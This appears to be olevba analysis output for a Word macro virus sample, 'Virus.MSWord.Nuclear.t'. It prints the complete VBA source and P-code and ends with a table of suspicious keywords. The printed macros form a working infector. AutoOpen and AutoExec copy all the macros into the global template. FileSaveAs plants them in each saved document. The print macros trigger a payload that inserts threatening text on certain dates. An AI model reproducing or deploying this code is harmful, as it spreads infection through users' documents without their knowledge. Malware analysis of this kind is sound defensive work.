olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nuclear.t
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nuclear.t - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FilePrintDefault.bas 
in file: Virus.MSWord.Nuclear.t - OLE stream: 'Macros/VBA/FilePrintDefault'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Prints the active document using the current defaults"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FilePrintDefault.MAIN"
WordBasic.Call "PersilMan"
WordBasic.FilePrintDefault
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Nuclear.t - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Busted

WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If (dlg.Format = 0) Or (dlg.Format = 1) Then
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[WindowName$]() + ":AutoExec", 0
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen", 0
    WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs", 0
    WordBasic.MacroCopy "Global:FilePrint", WordBasic.[WindowName$]() + ":FilePrint", 0
    WordBasic.MacroCopy "Global:FileOpen", WordBasic.[WindowName$]() + ":FileOpen", 0
    WordBasic.MacroCopy "Global:FilePrintDefault", WordBasic.[WindowName$]() + ":FilePrintDefault", 0
    WordBasic.MacroCopy "Global:PersilMan", WordBasic.[WindowName$]() + ":PersilMan", 0
    WordBasic.MacroCopy "Global:ClearKepek", WordBasic.[WindowName$]() + ":ClearKepek", 0
    dlg.Format = 1
End If
WordBasic.FileSaveAs dlg
GoTo EndIt

Busted:
Rem If Err <> 102 Then
Rem     FileSaveAs dlg
Rem EndIf

EndIt:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ClearKepek.bas 
in file: Virus.MSWord.Nuclear.t - OLE stream: 'Macros/VBA/ClearKepek'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    Rem Do kust nothing
End Sub
-------------------------------------------------------------------------------
VBA MACRO PersilMan.bas 
in file: Virus.MSWord.Nuclear.t - OLE stream: 'Macros/VBA/PersilMan'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
If WordBasic.Month(WordBasic.Now()) > 4 And WordBasic.Day(WordBasic.Now()) > 20 Then
    If WordBasic.Second(WordBasic.Now()) > 55 Then
        WordBasic.EndOfDocument
        WordBasic.Insert Chr___() '$11
        WordBasic.Insert "PersilMan will take his revenge"
        WordBasic.Insert Chr___() '$11
        WordBasic.Insert "you will be cleaned up by PersilMan, SOON"
        WordBasic.StartOfDocument
    End If
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO FilePrint.bas 
in file: Virus.MSWord.Nuclear.t - OLE stream: 'Macros/VBA/FilePrint'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Prints the active document"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FilePrint.MAIN"
WordBasic.Call "PersilMan"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FilePrint(False)
WordBasic.CurValues.FilePrint dlg
WordBasic.Dialog.FilePrint dlg
WordBasic.FilePrint dlg
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Nuclear.t - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Opens an existing document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Nuclear.t - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
If IfNotInstalled = 0 Then
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpen", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "Global:FileSaveAs", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrint", "Global:FilePrint", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileOpen", "Global:FileOpen", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrintDefault", "Global:FilePrintDefault", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":PersilMan", "Global:PersilMan", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ClearKepek", "Global:ClearKepek", 0
End If
WordBasic.Call "ClearKepek"
End Sub

Private Function IfNotInstalled()
Dim i
Dim CheckInstalled
    IfNotInstalled = 0
    If WordBasic.CountMacros(0) > 0 Then
        For i = 1 To WordBasic.CountMacros(0)
            If WordBasic.[MacroName$](i, 0) = "PersilMan" Then
                CheckInstalled = 1
            End If
        Next i
    End If
End Function
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Nuclear.t - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()

On Error GoTo -1: On Error GoTo Busted
If IfNotInstalled = 0 Then
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpen", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "Global:FileSaveAs", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrint", "Global:FilePrint", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileOpen", "Global:FileOpen", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrintDefault", "Global:FilePrintDefault", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":PersilMan", "Global:PersilMan", 0
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ClearKepek", "Global:ClearKepek", 0
End If
WordBasic.Call "ClearKepek"
GoTo End_The_Pain:
Busted:
If Err.Number = 509 Then
    Rem do nothing
End If
End_The_Pain:
End Sub

Private Function IfNotInstalled()
Dim i
Dim CheckInstalled
    IfNotInstalled = 0
    If WordBasic.CountMacros(0) > 0 Then
        For i = 1 To WordBasic.CountMacros(0)
            If WordBasic.[MacroName$](i, 0) = "PersilMan" Then
                CheckInstalled = 1
            End If
        Next i
    End If
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Nuclear.t
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/FilePrintDefault - 1159 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	LitStr 0x0009 "PersilMan"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #3:
' 	Ld WordBasic 
' 	ArgsMemCall FilePrintDefault 0x0000 
' Line #4:
' 	EndSub 
' Macros/VBA/FileSaveAs - 2533 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #3:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Busted 
' Line #4:
' Line #5:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #6:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #7:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #8:
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #9:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #10:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #11:
' 	LitStr 0x0010 "Global:FilePrint"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":FilePrint"
' 	Add 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #12:
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #13:
' 	LitStr 0x0017 "Global:FilePrintDefault"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0011 ":FilePrintDefault"
' 	Add 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #14:
' 	LitStr 0x0010 "Global:PersilMan"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":PersilMan"
' 	Add 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #15:
' 	LitStr 0x0011 "Global:ClearKepek"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000B ":ClearKepek"
' 	Add 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #16:
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #19:
' 	GoTo EndIt 
' Line #20:
' Line #21:
' 	Label Busted 
' Line #22:
' 	Rem 0x0013 " If Err <> 102 Then"
' Line #23:
' 	Rem 0x0013 "     FileSaveAs dlg"
' Line #24:
' 	Rem 0x0006 " EndIf"
' Line #25:
' Line #26:
' 	Label EndIt 
' Line #27:
' 	EndSub 
' Macros/VBA/ClearKepek - 883 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Rem 0x0010 " Do kust nothing"
' Line #3:
' 	EndSub 
' Macros/VBA/PersilMan - 1450 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Month 0x0001 
' 	LitDI2 0x0004 
' 	Gt 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0014 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #3:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Second 0x0001 
' 	LitDI2 0x0037 
' 	Gt 
' 	IfBlock 
' Line #4:
' 	Ld WordBasic 
' 	ArgsMemCall EndOfDocument 0x0000 
' Line #5:
' 	ArgsLd Chr___ 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' 	QuoteRem 0x0022 0x0003 "$11"
' Line #6:
' 	LitStr 0x001F "PersilMan will take his revenge"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #7:
' 	ArgsLd Chr___ 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' 	QuoteRem 0x0022 0x0003 "$11"
' Line #8:
' 	LitStr 0x0029 "you will be cleaned up by PersilMan, SOON"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #9:
' 	Ld WordBasic 
' 	ArgsMemCall StartOfDocument 0x0000 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	EndSub 
' Macros/VBA/FilePrint - 1311 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	LitStr 0x0009 "PersilMan"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #3:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FilePrint 0x0001 
' 	Set dlg 
' Line #4:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FilePrint 0x0001 
' Line #5:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FilePrint 0x0001 
' Line #6:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FilePrint 0x0001 
' Line #7:
' 	EndSub 
' Macros/VBA/FileOpen - 1281 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileOpen 0x0001 
' 	Set dlg 
' Line #3:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileOpen 0x0001 
' Line #4:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileOpen 0x0001 
' Line #5:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0001 
' Line #6:
' 	EndSub 
' Macros/VBA/AutoOpen - 2323 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Ld IfNotInstalled 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #3:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	LitStr 0x000F "Global:AutoExec"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #4:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x000F "Global:AutoOpen"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #5:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #6:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":FilePrint"
' 	Add 
' 	LitStr 0x0010 "Global:FilePrint"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #7:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	LitStr 0x000F "Global:FileOpen"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #8:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0011 ":FilePrintDefault"
' 	Add 
' 	LitStr 0x0017 "Global:FilePrintDefault"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #9:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":PersilMan"
' 	Add 
' 	LitStr 0x0010 "Global:PersilMan"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #10:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000B ":ClearKepek"
' 	Add 
' 	LitStr 0x0011 "Global:ClearKepek"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	LitStr 0x000A "ClearKepek"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #13:
' 	EndSub 
' Line #14:
' Line #15:
' 	FuncDefn (Private Function IfNotInstalled())
' Line #16:
' 	Dim 
' 	VarDefn i
' Line #17:
' 	Dim 
' 	VarDefn CheckInstalled
' Line #18:
' 	LitDI2 0x0000 
' 	St IfNotInstalled 
' Line #19:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #21:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0009 "PersilMan"
' 	Eq 
' 	IfBlock 
' Line #22:
' 	LitDI2 0x0001 
' 	St CheckInstalled 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	EndFunc 
' Macros/VBA/AutoExec - 2596 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' Line #3:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Busted 
' Line #4:
' 	Ld IfNotInstalled 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	LitStr 0x000F "Global:AutoExec"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #6:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x000F "Global:AutoOpen"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #7:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #8:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":FilePrint"
' 	Add 
' 	LitStr 0x0010 "Global:FilePrint"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #9:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	LitStr 0x000F "Global:FileOpen"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #10:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0011 ":FilePrintDefault"
' 	Add 
' 	LitStr 0x0017 "Global:FilePrintDefault"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #11:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":PersilMan"
' 	Add 
' 	LitStr 0x0010 "Global:PersilMan"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #12:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000B ":ClearKepek"
' 	Add 
' 	LitStr 0x0011 "Global:ClearKepek"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitStr 0x000A "ClearKepek"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #15:
' 	GoTo End_The_Pain 
' 	BoS 0x0000 
' Line #16:
' 	Label Busted 
' Line #17:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x01FD 
' 	Eq 
' 	IfBlock 
' Line #18:
' 	Rem 0x000B " do nothing"
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	Label End_The_Pain 
' Line #21:
' 	EndSub 
' Line #22:
' Line #23:
' 	FuncDefn (Private Function IfNotInstalled())
' Line #24:
' 	Dim 
' 	VarDefn i
' Line #25:
' 	Dim 
' 	VarDefn CheckInstalled
' Line #26:
' 	LitDI2 0x0000 
' 	St IfNotInstalled 
' Line #27:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #29:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0009 "PersilMan"
' 	Eq 
' 	IfBlock 
' Line #30:
' 	LitDI2 0x0001 
' 	St CheckInstalled 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

